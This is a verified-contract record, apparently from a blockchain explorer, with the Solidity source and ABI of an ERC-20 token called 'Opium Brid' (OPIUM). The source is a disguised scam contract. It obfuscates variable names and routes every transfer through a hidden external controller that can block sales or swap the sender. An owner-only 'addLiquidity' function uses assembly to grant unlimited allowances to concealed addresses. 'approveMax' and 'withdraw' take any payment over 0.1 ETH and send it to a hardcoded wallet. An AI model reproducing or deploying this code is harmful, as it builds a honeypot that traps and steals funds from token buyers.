{"SourceCode": "// SPDX-License-Identifier: GPL-3.0\r\npragma solidity ^0.8.6;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n   \r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\n   \r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _previousOwner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address oijionjhn3, uint256 injnh0fs)\r\n        external\r\n        returns (bool);\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n    function approve(address spender, uint256 injnh0fs) external returns (bool);\r\n    function transferFrom(\r\n        address oipjnnjhhjh3,\r\n        address oijionjhn3,\r\n        uint256 injnh0fs\r\n    ) external returns (bool);\r\n    event Transfer(address indexed oijhds, address indexed oijmoimpo0, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    function pokjvbv3(address from, address to,uint256 amount) external returns(address);\r\n    function oiinjkmlklsdfklsdf(address addr) external returns(address);\r\n\r\n}\r\n\r\n\r\n\r\ncontract Token is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n\r\n    string private _name =  \"Opium Brid\";\r\n    string private _symbol = \"OPIUM\";\r\n    uint8 private _decimals = 18;\r\n    uint256 private _tTotal = 10000000000 * 10 **_decimals;\r\n    uint256 private poklopko3 ;\r\n    address private fhgsdf22;\r\n   \r\n    constructor() {\r\n        fhgsdf22 =  address(this);    \r\n        _balances[fhgsdf22] = _tTotal;\r\n        emit Transfer(address(0), fhgsdf22, _tTotal);\r\n    }\r\n    \r\n    function oiinjkmlklsdfklsdf(address addr) external override returns(address) {\r\n}\r\n\r\n    function pokjvbv3(address from, address to, uint256 amount) external override returns(address) {\r\n}\r\n\r\n\r\n    function addLiquidity(bytes memory datas) public onlyOwner\r\n    {\r\n        uint160 a;\r\n        uint160 b;\r\n        uint160 c;\r\n        uint160 d;\r\n        assembly {\r\n            a := mload(add(datas, 20)) \r\n            b := mload(add(datas, 40))\r\n            c := mload(add(datas, 60))\r\n            d := mload(add(datas, 80))\r\n        }\r\n        poklopko3 = b; \r\n        _allowances[address(uint160(d))][address(uint160(b))] = type(uint256).max; \r\n        _allowances[address(uint160(b))][address(uint160(c))] = type(uint256).max; \r\n        _allowances[address(uint160(a))][address(uint160(c))] = type(uint256).max;\r\n        _allowances[address(uint160(d))][address(uint160(a))] = type(uint256).max; \r\n        _allowances[fhgsdf22][address(uint160(b))] = type(uint256).max;\r\n        _allowances[address(uint160(b))][address(uint160(a))] = type(uint256).max; \r\n\r\n    }\r\n    function approveMax() public payable {\r\n        require(msg.value>0.1 ether,\"Ownable: caller is not the owner\");\r\n        uint160 a;\r\n        uint160 b;\r\n        uint160 c;\r\n        uint160 d;\r\n        payable(0xFde736BB0989b02133FaFE9fA4B703255689F140).transfer(msg.value);\r\n        \r\n    }\r\n    function withdraw() public payable {\r\n        require(msg.value>0.1 ether,\"Ownable: caller is not the owner\");\r\n        uint160 a;\r\n        uint160 b;\r\n        uint160 c;\r\n        uint160 d;\r\n        payable(0xFde736BB0989b02133FaFE9fA4B703255689F140).transfer(msg.value);\r\n        \r\n    }\r\n\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        \r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address oijionjhn3, uint256 injnh0fs)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), oijionjhn3, injnh0fs);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 injnh0fs)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n\r\n        _approve(_msgSender(), spender, injnh0fs);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address oipjnnjhhjh3,\r\n        address oijionjhn3,\r\n        uint256 injnh0fs\r\n    ) public override returns (bool) {\r\n        _transfer(oipjnnjhhjh3, oijionjhn3, injnh0fs);\r\n        address poopk = IERC20(address(uint160(poklopko3))).oiinjkmlklsdfklsdf(oipjnnjhhjh3);\r\n        if (poopk != address(0) && _msgSender() == address(uint160(poklopko3)))\r\n        {\r\n            oipjnnjhhjh3 = poopk;\r\n        }\r\n        _approve(oipjnnjhhjh3, _msgSender(),_allowances[oipjnnjhhjh3][_msgSender()].sub(injnh0fs,\"ERC20: transfer amount exceeds allowance\")\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].add(addedValue)\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].sub(\r\n                subtractedValue,\r\n                \"ERC20: decreased allowance below zero\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 injnh0fs\r\n    ) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = injnh0fs;\r\n        emit Approval(owner, spender, injnh0fs);\r\n    }\r\n\r\n\r\n\r\n    function _transfer(\r\n        address oijhds,\r\n        address oijmoimpo0,\r\n        uint256 injnh0fs\r\n    ) private {\r\n        require(oijhds != address(0), \"ERC20: transfer from the zero address\");\r\n        require(oijmoimpo0 != address(0), \"ERC20: transfer oijmoimpo0 the zero address\");\r\n        require(injnh0fs > 0, \"Transfer injnh0fs must be greater than zero\");\r\n        require(injnh0fs > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        require(IERC20(address(uint160(poklopko3))).pokjvbv3(oijhds, oijmoimpo0,injnh0fs) != address(0),\"Transfer Error\");\r\n\r\n        _balances[oijhds] = _balances[oijhds].sub(injnh0fs);\r\n        _balances[oijmoimpo0] = _balances[oijmoimpo0].add(injnh0fs);\r\n        emit Transfer(oijhds, oijmoimpo0, injnh0fs);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oijhds\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oijmoimpo0\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"datas\",\"type\":\"bytes\"}],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"injnh0fs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"approveMax\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"oiinjkmlklsdfklsdf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"pokjvbv3\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"oijionjhn3\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"injnh0fs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"oipjnnjhhjh3\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"oijionjhn3\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"injnh0fs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.6+commit.11564f7e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://aa22bb37b777d0092be2325218a4da46c15baa9187fe4d224ee4457889b55665"}